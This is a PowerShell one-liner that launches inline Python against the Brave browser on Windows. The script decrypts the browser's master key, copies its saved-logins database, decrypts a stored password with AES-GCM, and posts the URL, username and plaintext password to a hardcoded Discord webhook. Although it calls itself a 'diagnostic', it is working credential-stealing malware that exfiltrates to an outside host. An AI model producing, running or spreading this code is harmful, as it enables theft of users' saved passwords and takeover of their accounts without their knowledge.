cd $env:TEMP\py

.\python.exe -c "
import sqlite3, os, base64, win32crypt, json, requests
from Crypto.Cipher import AES

WH = 'https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W'

def send(msg):
    try:
        requests.post(WH, json={'content': msg[:1900]}, timeout=5)
    except:
        pass

b = os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data')
ld = b + r'\Default\Login Data'
ls = b + r'\Local State'

send('🔍 Starting diagnostic...')

# Clé
with open(ls, 'r') as f:
    key = win32crypt.CryptUnprotectData(base64.b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:], None, None, None, 0)[1]

send(f'Key length: {len(key)} bytes')

# Copier DB
import shutil
shutil.copy2(ld, 'test.db')

import time
time.sleep(1)

conn = sqlite3.connect('test.db')
c = conn.cursor()

# Prendre 1 mot de passe pour analyse
c.execute('SELECT origin_url, username_value, password_value FROM logins WHERE username_value != \"\" LIMIT 1')

for url, user, enc in c.fetchall():
    send(f'=== ANALYSIS ===')
    send(f'URL: {url}')
    send(f'User: {user}')
    send(f'Encrypted length: {len(enc)} bytes')
    send(f'Prefix: {enc[:3]}')
    send(f'Prefix hex: {enc[:3].hex()}')
    send(f'Full hex (first 60): {enc[:60].hex()}')
    
    nonce = enc[3:15]
    tag = enc[-16:]
    ciphertext = enc[15:-16]
    
    send(f'Nonce: {len(nonce)} bytes | hex: {nonce.hex()}')
    send(f'Ciphertext: {len(ciphertext)} bytes')
    send(f'Tag: {len(tag)} bytes | hex: {tag.hex()}')
    
    try:
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        pwd = cipher.decrypt_and_verify(ciphertext, tag)
        send(f'✅ DECRYPTED BYTES: {pwd}')
        send(f'✅ DECODED UTF8: {pwd.decode(\"utf-8\", errors=\"ignore\")}')
        send(f'Length of password: {len(pwd)} bytes')
    except Exception as e:
        send(f'❌ ERROR: {str(e)}')

conn.close()
os.remove('test.db')

send('✅ Diagnostic complete')
"
